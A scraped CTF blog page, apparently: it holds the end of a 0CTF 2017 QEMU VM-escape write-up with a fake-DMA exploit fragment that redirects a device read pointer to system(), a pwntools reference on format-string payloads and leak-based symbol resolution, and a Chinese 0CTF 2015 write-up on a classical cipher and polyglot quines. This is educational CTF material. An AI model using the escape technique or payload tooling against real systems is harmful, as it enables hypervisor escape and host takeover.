<li>set <code>opaque-&gt;dma_state-&gt;phys_mem_read</code> to <code>system</code></li>
<li>set <code>opaque-&gt;dma_buf</code> to <code>cmd</code></li>
<li>make sure <code>opaque-&gt;dma_state-&gt;cmd != 0</code>.</li>
</ol>
<p>In <code>vdd_linear_write</code>, when <code>addr == 0</code>, a buffer will be allocated with size of <code>opaque-&gt;dma_len</code>. And the data in <code>opaque-&gt;dma_state-&gt;src</code> with length of <code>opaque-&gt;dma_len</code> will be copied to <code>opaque-&gt;buf</code>, then copied to <code>opaque-&gt;dma_state-&gt;dst</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">vdd_linear_write</span><span class="params">(TencentPCIState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;dma_state &amp;&amp; addr &lt;= <span class="number">13</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (_DWORD)((<span class="keyword">char</span> *)off_6EF324 + off_6EF324[addr]) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> ( opaque-&gt;buf )</span><br><span class="line">          g_free((rcu_head *)opaque-&gt;buf);</span><br><span class="line">        opaque-&gt;buf = (<span class="keyword">uint8_t</span> *)g_malloc0(opaque-&gt;dma_len);</span><br><span class="line">        vdd_dma_read(opaque-&gt;buf, opaque-&gt;dma_state-&gt;src, opaque-&gt;dma_len);</span><br><span class="line">        vdd_dma_write(opaque-&gt;buf, opaque-&gt;dma_state-&gt;dst, opaque-&gt;dma_len);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_fake_dma</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma</span> <span class="title">fakedma</span>;</span></span><br><span class="line">    fakedma.cmd = <span class="number">2</span>;</span><br><span class="line">    fakedma.phys_mem_read = system_addr;</span><br><span class="line">    <span class="built_in">memcpy</span>(pbuf, (<span class="keyword">void</span> *)&amp;fakedma, <span class="keyword">sizeof</span>(fakedma));</span><br><span class="line">    set_dmalen(<span class="number">0x330</span>);</span><br><span class="line">    set_dmastate_src(virt_to_phys(pbuf));</span><br><span class="line">    set_dmastate_dst(virt_to_phys(pbuf));</span><br><span class="line">    outb(<span class="number">0</span>, VDB_PORT + <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/tixAsK6.png" alt></p>
<p><a href="https://gist.github.com/Eadom/3d5600b6931fbf328ffb20f10eeb3a52" target="_blank" rel="noopener">Exploit script</a></p>
<p>Thanks for Atum’s help.</p>

                    
                        


                    
                    
                        <p>
                            <a
                                href="/writeups/qemu-escape-vm-escape-from-0ctf-2017-finals-writeup/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/uncategorized/pwntools-quick-reference-guide/"
                            aria-label=": Pwntools Quick Reference Guide"
                        >
                            Pwntools Quick Reference Guide
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2016-03-02T18:33:29+08:00">
	
		    Mar 02, 2016
    	
    </time>
    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.</p>
</blockquote>
<h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p>Setting the Target Architecture and OS:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'big'</span>, log_level=<span class="string">'debug'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h2><p>It’s similar to <code>logging.Logger</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>log.info(<span class="string">'Hello, world!'</span>)</span><br><span class="line">[*] Hello, world!</span><br></pre></td></tr></table></figure>
<h2 id="Making-connections"><a href="#Making-connections" class="headerlink" title="Making connections"></a>Making connections</h2><h3 id="New-a-tube"><a href="#New-a-tube" class="headerlink" title="New a tube"></a>New a tube</h3><p>Create a tube instance from a local program or a remote conncetion.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conn = process(<span class="string">'./pwn'</span>)</span><br><span class="line">conn = remote(<span class="string">'ftp.debian.org'</span>,<span class="number">21</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Comunication"><a href="#Comunication" class="headerlink" title="Comunication"></a>Comunication</h3><h4 id="Send-and-recv"><a href="#Send-and-recv" class="headerlink" title="Send and recv"></a>Send and recv</h4><p>There are many functions to send or recv data via tube.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">recv(numb = <span class="number">4096</span>, timeout = default)</span><br><span class="line">recvuntil(delims, drop=<span class="literal">False</span>, timeout = default)</span><br><span class="line">recvn(numb, timeout = default)</span><br><span class="line">recvlines(numlines, keepends = <span class="literal">False</span>, timeout = default)</span><br><span class="line">recvline(keepends = <span class="literal">True</span>, timeout = default)</span><br><span class="line">recvregex(regex, exact = <span class="literal">False</span>, timeout = default)</span><br><span class="line">recvrepeat(timeout = default)  <span class="comment"># Receives data until a timeout or EOF is reached.</span></span><br><span class="line">recvall(self, timeout=Timeout.forever)  <span class="comment"># Receives data until EOF is reached.</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">send(data)</span><br><span class="line">sendline(line)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">interactive()</span><br></pre></td></tr></table></figure>
<h4 id="Listen"><a href="#Listen" class="headerlink" title="Listen"></a>Listen</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = listen(port=<span class="number">2333</span>, bindaddr = <span class="string">"0.0.0.0"</span>)</span><br><span class="line">c = l.wait_for_connection()</span><br><span class="line">c.recv()</span><br></pre></td></tr></table></figure>
<h2 id="ELF-Manipulation"><a href="#ELF-Manipulation" class="headerlink" title="ELF Manipulation"></a>ELF Manipulation</h2><p>Stop hard-coding things! Look them up at runtime with <code>pwnlib.elf</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">'/bin/cat'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.address) </span><br><span class="line"><span class="number">0x400000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.symbols[<span class="string">'write'</span>]) </span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.got[<span class="string">'write'</span>]) </span><br><span class="line"><span class="number">0x60b070</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.plt[<span class="string">'write'</span>]) </span><br><span class="line"><span class="number">0x401680</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.address = <span class="number">0x0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.symbols[<span class="string">'write'</span>]) </span><br><span class="line"><span class="number">0x1680</span></span><br></pre></td></tr></table></figure>
<p>You can even patch and save the files.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">'/bin/cat'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.read(e.address+<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="string">'ELF'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.asm(e.address, <span class="string">'ret'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e.save(<span class="string">'/tmp/quiet-cat'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(file(<span class="string">'/tmp/quiet-cat'</span>,<span class="string">'rb'</span>).read(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<h2 id="Debug-with-gdb"><a href="#Debug-with-gdb" class="headerlink" title="Debug with gdb"></a>Debug with gdb</h2><p><code>pwnlib.gdb.attach()</code> starts GDB in a <strong>new terminal</strong> and attach to target.</p>
<p>Target can be a process, (addr, port), or ssh channel.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./helloworld'</span>)</span><br><span class="line">gdb.attach(p, execute=<span class="string">"b *0x4000000"</span>)  <span class="comment"># execute:GDB script to run after attaching.</span></span><br><span class="line"></span><br><span class="line">gdb.attach((<span class="string">'127.0.0.1'</span>, <span class="number">8765</span>))  <span class="comment"># attach to remote gdb server</span></span><br><span class="line"></span><br><span class="line">s = ssh(host=<span class="string">'rpi'</span>, user=<span class="string">'pi'</span>)</span><br><span class="line">conn = s.process(<span class="string">'/tmp/helloworld'</span>)</span><br><span class="line">gdb.attach(conn)  <span class="comment"># start gdb on remote server via ssh</span></span><br></pre></td></tr></table></figure>
<p>If you want to start GDB in a split window in tmux:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-v'</span>]</span><br></pre></td></tr></table></figure>
<h2 id="Fmtstr"><a href="#Fmtstr" class="headerlink" title="Fmtstr"></a>Fmtstr</h2><p><code>pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></p>
<p>It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from <code>context.bits</code></p>
<p>Parameters:    </p>
<ul>
<li>offset (int) – the first formatter’s offset you control</li>
<li>writes (dict) – dict with addr, value {addr: value, addr2: value2}</li>
<li>numbwritten (int) – number of byte already written by the printf function</li>
<li>write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)</li>
</ul>
<h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p><code>pwnlib.dynelf</code> — Resolving remote functions using leaks</p>
<p>Resolve symbols in loaded, dynamically-linked ELF binaries. Given a function which can leak data at an arbitrary address, any symbol in any loaded library can be resolved.</p>
<p>This is an example in the document:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">'./pwnme'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let's say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">'libc'</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">'./pwnme'</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">'libc'</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">'system'</span>)      == system</span><br></pre></td></tr></table></figure>
<h2 id="Utility"><a href="#Utility" class="headerlink" title="Utility"></a>Utility</h2><h3 id="Generation-of-unique-sequences"><a href="#Generation-of-unique-sequences" class="headerlink" title="Generation of unique sequences"></a>Generation of unique sequences</h3><p><code>pwnlib.util.cyclic.cyclic(length = None, alphabet = string.ascii_lowercase, n = 4)</code></p>
<p><code>pwnlib.util.cyclic.cyclic_find(subseq, alphabet = string.ascii_lowercase, n = None)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic(<span class="number">20</span>)</span><br><span class="line"><span class="string">'aaaabaaacaaadaaaeaaa'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic(alphabet = <span class="string">"ABC"</span>, n = <span class="number">3</span>)</span><br><span class="line"><span class="string">'AAABAACABBABCACBACCBBBCBCCC'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cyclic_find(cyclic(alphabet = <span class="string">"ABC"</span>, n = <span class="number">3</span>)[<span class="number">3</span>:<span class="number">6</span>], alphabet = <span class="string">"ABC"</span>, n = <span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h3 id="Assembly-and-Disassembly"><a href="#Assembly-and-Disassembly" class="headerlink" title="Assembly and Disassembly"></a>Assembly and Disassembly</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">'mov eax, 0'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'b800000000'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> disasm(<span class="string">'6a0258cd80ebf9'</span>.decode(<span class="string">'hex'</span>))</span><br><span class="line">   <span class="number">0</span>:   <span class="number">6</span>a <span class="number">02</span>                   push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">2</span>:   <span class="number">58</span>                      pop    eax</span><br><span class="line">   <span class="number">3</span>:   cd <span class="number">80</span>                   int    <span class="number">0x80</span></span><br><span class="line">   <span class="number">5</span>:   eb f9                   jmp    <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<h3 id="Packing-Integers"><a href="#Packing-Integers" class="headerlink" title="Packing Integers"></a>Packing Integers</h3><p><code>p8()</code>, <code>p16()</code>, <code>p32()</code>, <code>p64()</code>, <code>u8()</code>, <code>u16()</code>, <code>u32()</code>, <code>u64()</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0xdeadbeef</span>) == struct.pack(<span class="string">'I'</span>, <span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>leet = <span class="string">'37130000'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u32(<span class="string">'abcd'</span>) == struct.unpack(<span class="string">'I'</span>, <span class="string">'abcd'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
<p><code>pwnlib.util.packing.pack/unpack(number, word_size = None, endianness = None, sign = None, **kwargs)</code></p>

                    
                        


                    
                    
                        <p>
                            <a
                                href="/uncategorized/pwntools-quick-reference-guide/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/writeups/0ctf-2015-writeup/"
                            aria-label=": 0CTF2015 Writeup"
                        >
                            0CTF2015 Writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2015-04-02T23:59:51+08:00">
	
		    Apr 02, 2015
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>没怎么做alictf，做了0ctf。渣渣又被虐了……分享下writeup……</p>
<h1 id="oldcrypto"><a href="#oldcrypto" class="headerlink" title="oldcrypto"></a>oldcrypto</h1><blockquote>
<p>Old crypto is not old enough to be broken. Notice: all in lowercase</p>
</blockquote>
<p>阅读这个是一个多表替换的密码，i两边是对称的，所以可以把i的变化去掉。这个有点类似维吉尼亚，不过代换是通过矩阵，而且是对称的。wiki下应该是<strong> 博福特密码</strong>。 解法跟维吉尼亚密码一样，wiki说有<em>卡西斯基试验</em>或者<em>弗里德曼试验</em>，重复指数的代码找不到了就用的卡西斯基试验的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def search():</span><br><span class="line">i = 0</span><br><span class="line">with open(&apos;deletei&apos;) as f:</span><br><span class="line">cipher = f.read().strip()</span><br><span class="line">while i &lt; len(cipher):</span><br><span class="line">now = cipher[i:i+3]</span><br><span class="line">find = cipher[i+3:].find(cipher[i:i+3])</span><br><span class="line">if find != -1:</span><br><span class="line">print cipher[i:i+3], find+3</span><br><span class="line">i += 1</span><br></pre></td></tr></table></figure></p>
<p>找出来发现很多很长的密文有重复且间隔都是20的倍数。所以猜测key是20位。 之后拆分成20组频率分析</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def findk(src, des):</span><br><span class="line">for k in xrange(26):</span><br><span class="line">if tr[k][ord(des)-ord(&apos;a&apos;)] == ord(src)-ord(&apos;a&apos;):</span><br><span class="line">return chr(k + ord(&apos;a&apos;))</span><br><span class="line"></span><br><span class="line">def key():</span><br><span class="line">k = &apos;&apos;</span><br><span class="line">with open(&apos;split2&apos;) as f:</span><br><span class="line">for line in f:</span><br><span class="line">fre = &#123;&#125;</span><br><span class="line">line = line.strip()</span><br><span class="line">for c in line:</span><br><span class="line">if c in fre:</span><br><span class="line">fre[c] += 1</span><br><span class="line">else:</span><br><span class="line">fre[c] = 1</span><br><span class="line">sort_fre = sorted(fre.iteritems(),key=lambda fre:fre[1],reverse=True)</span><br><span class="line">k += findk(&apos;e&apos;, sort_fre[0][0])</span><br><span class="line">print k</span><br></pre></td></tr></table></figure>
<p>都猜测出现最高的频率的是’e’，之后算出来的key = ‘wkaszhcslciyhwrusfun’。解出来发现不对，不过感觉但是最后fun应该是对的。之后通过查看解密的文章通过手工判断（文章最后是flag，而且用了20个o方便判断）解出key = ‘classicalcipherisfun’ flag:<strong>0ctf{classicalcipherisfun}</strong></p>
<h1 id="BabyPolyQuine"><a href="#BabyPolyQuine" class="headerlink" title="BabyPolyQuine"></a>BabyPolyQuine</h1><blockquote>
<p>Different people see different me. But I am always myself. 202.112.26.114:12321 Make the output of your program exactly the same as your source code. At least 3 correct to get this flag $python2 –version Python 2.7.6 $python3 –version Python 3.4.0 $gcc –version gcc (Ubuntu 4.8.2-19ubuntu1) 4.8.2 $ruby –version ruby 1.9.3p484 (2013-11-22 revision 43786) [x86_64-linux] $perl –version This is perl 5, version 18, subversion 2 (v5.18.2) built for x86_64-linux-gnu-thread-multi</p>
</blockquote>
<p>维基百科搜到一个代码通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include/*</span><br><span class="line">q=&apos;&apos;&apos;*/</span><br><span class="line">main()&#123;char*_;/*=;sub _:lvalue&#123;$_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;</span><br><span class="line">def printf(a,*b):print a%b,</span><br><span class="line">q</span><br><span class="line">#*/</span><br><span class="line">_=&quot; #include/*%cq=&apos;&apos;&apos;*/%cmain()&#123;char*_;/*=;sub _:lvalue&#123;%c_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;%cdef printf(a,*b):print a%%b,%cq%c#*/%c_=%c%s%c;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);%c#/*%cq=&apos;&apos;&apos;*/%c&#125;//&apos;&apos;&apos;#=%c&quot;;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);</span><br><span class="line">#/*</span><br><span class="line">q=&apos;&apos;&apos;*/</span><br><span class="line">&#125;//&apos;&apos;&apos;#=</span><br></pre></td></tr></table></figure></p>
<p>flag:<strong>0ctf{The very moment of raising beginner’s mind is the accomplishment of true awakening itself}</strong></p>
<h1 id="PolyQuine"><a href="#PolyQuine" class="headerlink" title="PolyQuine"></a>PolyQuine</h1><blockquote>
<p>BabyPolyQuine 满足 All 5 correct required to get this flag</p>
</blockquote>
<p>上面的代码在python3会出问题，尝试加上括号，不过python3会多打一个空行。所以想办法利用不打空行的打印函数，想到stdout.write()于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include/*</span><br><span class="line">q=&apos;&apos;&apos;*/</span><br><span class="line">main()&#123;char*_;/*=;sub _:lvalue&#123;$_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;</span><br><span class="line">def printf(a,*b):__import__(&apos;sys&apos;).stdout.write(a%b)</span><br><span class="line">q</span><br><span class="line">#*/</span><br><span class="line">_=&quot; #include/*%cq=&apos;&apos;&apos;*/%cmain()&#123;char*_;/*=;sub _:lvalue&#123;%c_&#125;&lt;&lt;q;#&apos;;&lt;&lt;q#&apos;&apos;&apos;%cdef printf(a,*b):__import__(&apos;sys&apos;).stdout.write(a%%b)%cq%c#*/%c_=%c%s%c;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);%c#/*%cq=&apos;&apos;&apos;*/%c&#125;//&apos;&apos;&apos;#=%c&quot;;printf(_,10,10,36,10,10,10,10,34,_,34,10,10,10,10);</span><br><span class="line">#/*</span><br><span class="line">q=&apos;&apos;&apos;*/</span><br><span class="line">&#125;//&apos;&apos;&apos;#=</span><br></pre></td></tr></table></figure></p>
<p>flag:<strong>0ctf{“Yields falsehood when preceded by its quotation” yields falsehood when preceded by its quotation}</strong></p>
<h1 id="x-y-z"><a href="#x-y-z" class="headerlink" title="x-y-z"></a>x-y-z</h1><blockquote>
<p>-4.751373,-2.622809,2.428588;-4.435134,-3.046589,2.406030;-4.788052,-2.661979,2.464709 -4.692748,-2.599611,2.629112;-4.656070,-2.560445,2.592991;-4.788052,-2.661979,2.464709 -4.692748,-2.599611,2.629112;-4.788052,-2.661979,2.464709;-4.435134,-3.046589,2.406030 -4.656070,-2.560445,2.592991;-4.516017,-2.714652,2.570303;-4.751373,-2.622809,2.428588 -4.656070,-2.560445,2.592991;-4.751373,-2.622809,2.428588;-4.788052,-2.661979,2.464709 -4.611258,-2.777269,2.405960;-4.435134,-3.046589,2.406030;-4.751373,-2.622809,2.428588 -4.572725,-2.644557,2.333280;-4.603014,-2.680354,2.364417;-4.592222,-2.663824,2.351891 -4.571442,-2.773632,2.381504;-4.564917,-2.826000,2.397583;-4.611258,-2.777269,2.405960 ……</p>
</blockquote>
